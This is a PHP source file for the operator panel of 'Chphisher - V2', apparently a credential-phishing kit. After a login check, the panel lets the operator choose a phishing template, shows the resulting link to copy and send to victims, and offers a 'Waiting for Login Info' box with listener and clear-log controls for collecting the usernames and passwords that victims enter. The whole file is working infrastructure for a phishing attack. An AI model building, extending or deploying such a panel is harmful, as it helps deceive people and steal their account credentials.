<?php
session_start();
if(!isset($_SESSION['IAm-logined'])){
	header('location: ./auth/login.php');
	exit;
}

include "include/layout/header.php";


$template_url = array();

$actual_link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]";


if (isset($_POST['Templates'])){
	$template = $_POST['Templates'];
	// file_put_contents(templateSelectedPath, $template);

	array_push($template_url, $actual_link."/templates/".$template);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name=”viewport” content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="./assets/img/favicon.ico" type="image/x-icon">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link rel="stylesheet" href="./assets/css/Panel.css">
    <script src="./assets/js/jquery.min.js"></script>
    <title>Chphisher - V2</title>
</head>


<body id="ourbody" onload="check_new_version()" style="background-color: #2d2d33;">
    <div id="ctx"></div>


    <?php include "include/layout/selection.php";?>

    <?php if (!empty($template_url)):?>
        <div class="mt-2 d-flex justify-content-center" >
            <p id="path" class="form-control m-1 w-50 ptext">
                <?php foreach ($template_url as $tmp):?>
                        <?= $tmp ?>
                    <?php endforeach?>
            </p>
            <span class="input-group-btn m-1 cp-btn">
                <button class="btn btn-default" type="button" id="copy-button" data-toggle="tooltip" data-placement="button" title="Copy to Clipboard">
                    Copy
                </button>
            </span>
        </div>
    <?php endif?>

    <div class="mt-2 d-flex justify-content-center">
        <textarea class="form-control w-50 m-3" placeholder="Waiting for Login Info" id="loginInfo" rows="15" ></textarea>
    </div>

    <div class="mt-2 d-flex justify-content-center">
        <button class="btn btn-danger m-2" id="btn-listen">Listener Runing / press to stop</button>
        <!-- <button class="btn btn-success m-2" id="btn-listen" onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button> -->
        <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
    </div>



</body>
</html>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>
<script src="./assets/js/particles.min.js"></script>
    <script>
        particlesJS.load('ctx', './assets/json/panel.back.json', function() {
        console.log('callback - particles.js config loaded');
    });
    </script>